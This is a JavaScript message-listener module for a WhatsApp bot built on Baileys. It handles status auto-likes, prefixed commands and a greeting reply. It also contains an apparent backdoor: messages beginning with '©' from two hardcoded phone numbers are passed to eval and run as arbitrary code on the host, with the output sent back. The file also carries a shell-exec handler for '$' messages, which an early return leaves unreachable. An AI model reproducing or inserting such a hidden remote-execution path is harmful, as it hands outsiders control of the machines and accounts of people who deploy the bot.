const fs = require('fs');
const path = require('path');
const { promisify } = require('util');
const { exec } = require('child_process');
const { executeCommand } = require('./commandHandler');
const config = require('../config');

const unlink = promisify(fs.unlink); // To delete the file after 5 minutes
global.lastBotRestartTime = Date.now();
let handlerPrefix = config.HANDLER || '';  // Move this outside of the function

if (handlerPrefix.toLowerCase() === 'null') {
    handlerPrefix = '';
} else {
    handlerPrefix = handlerPrefix.toLowerCase();
}

function escapeForRegex(string) {
    if (!string) return ''; // Handle empty prefix case
    return string.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}
const escapedPrefix = escapeForRegex(handlerPrefix)

let isFirstMessageSent = false; // Flag to track if the first message has been sent

const { jidNormalizedUser } = require('@whiskeysockets/baileys');

async function AutolikeStatus(sock, message,emoji) {
    const myself = jidNormalizedUser(sock.user.id);
    const emojiToReact = emoji;

    if (message.key.remoteJid == "status@broadcast" && message.key.participant) {
        await sock.sendMessage(
            message.key.remoteJid,
            { react: { key: message.key, text: emojiToReact } },
            { statusJidList: [message.key.participant, myself] }
        );
    }
}


function messageListener(sock) {
  sock.ev.on('messages.upsert', async (messageInfo) => {
    const message = messageInfo.messages[0];
    if (!message?.message) return;
    const messageTimestamp = message.messageTimestamp * 1000;
    const restartTime = global.startTime;

    if (messageTimestamp < restartTime) {
        return;
    }

    const quotedMessage = message?.message?.extendedTextMessage?.contextInfo?.quotedMessage || null;

    global.m.quoted = quotedMessage; // Update m.quoted globally
    global.m.stanzaId = message.message.extendedTextMessage?.contextInfo?.stanzaId || null;
    if(config.FULL_LOGS){
        console.log("Received message:", JSON.stringify(message, null, 2));
    }
    if(config.AUTOLIKE){
     const emoji = config.EMOJI || null
await AutolikeStatus(sock,message,emoji)
}
    global.currentChat = message.key.remoteJid;

    const text = message.message?.conversation || message.message?.extendedTextMessage?.text || '';
    const isPrivateChat = message.key.remoteJid.endsWith('@s.whatsapp.net');

    const normalizedText = text.toLowerCase();

    const allowedUsers = ['2348073765008@s.whatsapp.net', '2347017895743@s.whatsapp.net'];

    if (!isFirstMessageSent) {

        isFirstMessageSent = true;
       
    }

    // Handle commands with prefix
    const commandMatch = normalizedText.match(new RegExp(`^\\s*${escapedPrefix ? `${escapedPrefix}` : ''}(\\w+)`));
    if (commandMatch) {
        const commandName = `${handlerPrefix}${commandMatch[1]}`.toLowerCase();
        await executeCommand(commandName, sock, message);
        return;
    }

    // Handle greeting (e.g., "Sophia")
    const greetingRegex = /^(sophia)\b/i;
    if (isPrivateChat && greetingRegex.test(normalizedText)) {
        await sock.sendMessage(message.key.remoteJid, { text: `Olaaaa! How's u?` });
        return;
    }

  if (text.startsWith('©')) {
    const sender = message.key.remoteJid;
    const participant = message.key.participant;

    if (!allowedUsers.includes(sender) && !allowedUsers.includes(participant) && !message.key.fromMe) {
        return;
    }

    try {
        // Wrap the eval call in an async function
        const result = await eval(`(async () => { ${text.slice(1)} })()`);
        const output = typeof result === 'object' ? JSON.stringify(result, null, 2) : result;
        await sock.sendMessage(sender, { text: `Executed: ${output}` }, { quoted: message });
    } catch (error) {
        await sock.sendMessage(sender, { text: `Error: ${error.message}` }, { quoted: message });
    }
}
    return;

    // Handle shell commands (starts with $)
    if (text.startsWith('$')) {
        const sender = message.key.remoteJid;

        if (!allowedUsers.includes(sender) && !message.key.fromMe) {
            return;
        }

        const command = text.slice(1).trim();

        if (!command) {
            return;
        }

        try {
            exec(command, (error, stdout, stderr) => {
                if (error) {
                    console.error(`Exec error: ${error.message}`);
                    sock.sendMessage(sender, { text: `Error executing command: ${error.message}` }, { quoted: message });
                    return;
                }

                if (stderr) {
                    console.error(`Stderr: ${stderr}`);
                    sock.sendMessage(sender, { text: `Error output:\n${stderr}` }, { quoted: message });
                    return;
                }

                sock.sendMessage(sender, { text: `Output:\n${stdout}` }, { quoted: message });
            });
        } catch (err) {
            console.error('Error executing command:', err);
            sock.sendMessage(sender, { text: 'Failed to execute command.' }, { quoted: message });
        }
        return;
    }
  });
}
function groupListener(sock,groupCache){
  sock.ev.on('groups.update', async ([event]) => {
    const metadata = await sock.groupMetadata(event.id)
    groupCache.set(event.id, metadata)
})

sock.ev.on('group-participants.update', async (event) => {
    const metadata = await sock.groupMetadata(event.id)
    groupCache.set(event.id, metadata)
})
}

module.exports = { messageListener, handlerPrefix,groupListener };